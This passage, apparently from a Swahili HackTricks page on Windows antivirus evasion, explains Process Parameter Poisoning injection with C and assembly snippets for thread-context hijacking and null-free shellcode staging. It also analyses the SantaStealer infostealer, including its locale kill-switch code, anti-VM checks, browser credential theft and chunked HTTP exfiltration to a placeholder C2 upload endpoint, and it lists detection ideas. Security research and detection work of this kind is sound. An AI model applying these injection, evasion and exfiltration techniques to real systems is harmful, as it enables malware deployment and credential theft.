- `lpCommandLine` lazima ielekeze kwenye **writable memory** kwa ajili ya `CreateProcessW`, na ina kikomo cha **Unicode characters 32,767** ikijumuisha null terminator.
- `lpEnvironment` lazima iwe Unicode environment block ya strings mfululizo za `NAME=VALUE\0` zinazomalizwa na `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo mapping ya `ShellInfo` inapaswa kuchukuliwa kama implementation detail badala ya stable documented contract.

Hii hubadilisha normal process creation kuwa **payload-transfer primitive**. Operator huunda child process kwa startup data inayodhibitiwa na attacker na kuiacha Windows ifanye cross-process copy.

### Remote lookup flow without remote write APIs

Baada ya child kuundwa, resolve copied buffer kwa kutumia **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma remote `PEB`
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kutekeleza parameter buffer iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si executable. P3 chain ya kawaida ni:

1. Unda process kwa kawaida (si suspended)
2. Fanya ukurasa wa parameter uliochaguliwa uwe executable kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena main thread handle ambayo tayari imerudishwa katika `PROCESS_INFORMATION`
4. Elekeza upya execution kwa `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye returned main thread handle.

Hii huepuka APIs kadhaa zinazofuatiliwa kwa kawaida kwa injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na staged shellcode

Carriers zote tatu ni **data ya string au inayofanana na string**, kwa hiyo raw payload iliyo na `0x00` hukatizwa wakati wa transfer. Workaround inayofaa ni **first stage isiyo na null** ambayo huunda upya constants wakati wa runtime na kisha kupakia arbitrary second stage.

Pattern rahisi ni XOR-based constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Hii huruhusu hatua ya kwanza kuunda stack strings, API arguments, DLL paths, au second-stage shellcode loader bila kuingiza null bytes kwenye transported parameter.

### Stack-based API calls kutoka hatua ya kwanza

Wakati hatua ya kwanza lazima iite APIs kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya target
- kutenga **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuweka `RSP` ikiwa **16-byte aligned** kabla ya call

Hatua ya pili inaweza kisha kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kujumpiwa, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya Detection

Fursa nzuri za hunting zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zinazofanya **process-parameter pages ziwe executable**
- mabadiliko hayo ya protection yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- remote reads za `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu isivyo kawaida / zenye entropy ya juu wakati wa kuunda process

### Notes

- P3 ni **cross-process transfer trick**, si execution primitive kamili peke yake: parameter iliyonakiliwa bado inahitaji mabadiliko ya execute-permission na njia ya kuelekeza execution.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na waandishi lakini ikakataliwa kwa sababu ndani yake hufikia primitives zenye mashaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## SantaStealer Tradecraft kwa Fileless Evasion na Credential Theft

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyochanganya AV bypass, anti-analysis na credential access katika workflow moja.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) huorodhesha keyboard layouts zilizowekwa kupitia `GetKeyboardLayoutList`. Ikiwa layout ya Cyrillic inapatikana, sample huunda marker tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha hailipuki kamwe kwenye locales zilizotengwa huku ikiacha hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya processes, huhash kila jina kwa custom rolling checksum, na kuilinganisha na blocklists zilizopachikwa za debuggers/sandboxes; hurudia checksum hiyo kwenye jina la computer na hukagua working directories kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kikomo cha chini cha process-count, uptime ya hivi karibuni), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hufanya timing checks kuzunguka sleeps ili kutambua single-stepping. Hit yoyote husababisha abort kabla ya modules kuanzishwa.

### Fileless helper + double ChaCha20 reflective loading

- DLL/EXE kuu hupachika Chromium credential helper ambayo aidha hudondoshwa kwenye disk au hu-map manually kwenye memory; hali ya fileless hutatua imports/relocations yenyewe, hivyo hakuna helper artifacts zinazoandikwa.
- Helper huyo huhifadhi second-stage DLL iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya passes zote mbili, hu-load blob reflectively (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing ili ku-inject kwenye Chromium browser inayoendelea, kurithi AppBound Encryption keys, na ku-decrypt passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti file count yake baada ya ~45s join window.
- Baada ya kumaliza, kila kitu huwekwa kwenye ZIP kwa kutumia library ya `miniz` iliyolinkiwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` hulala kwa 15s na kutiririsha archive kwa chunks za 10 MB kupitia HTTP POST kwenda `http://<C2>:6767/upload`, huku ikijifanya browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na chunk ya mwisho huongeza `complete: true` ili C2 ijue kuwa reassembly imekamilika.

## References

- [1] [Advanced Evasion Tradecraft: Udukuzi sahihi wa Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena pasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Infection Chain Mpya na Obfuscation ya ConfuserEx kwa DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita posture checks za Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa process na access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Marejeo ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDRs kwa Msaada wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja Ganda la Kinga la Windows Defender kwa Kutumia Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Marejeo ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pure Curtain: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Town: Infostealer Mpya na Yenye Malengo Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Node.js Malware kwa API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, na Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop Katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kubadilisha Driver ya Remediation ya Defender kuwa Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Self-Masking Functions kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
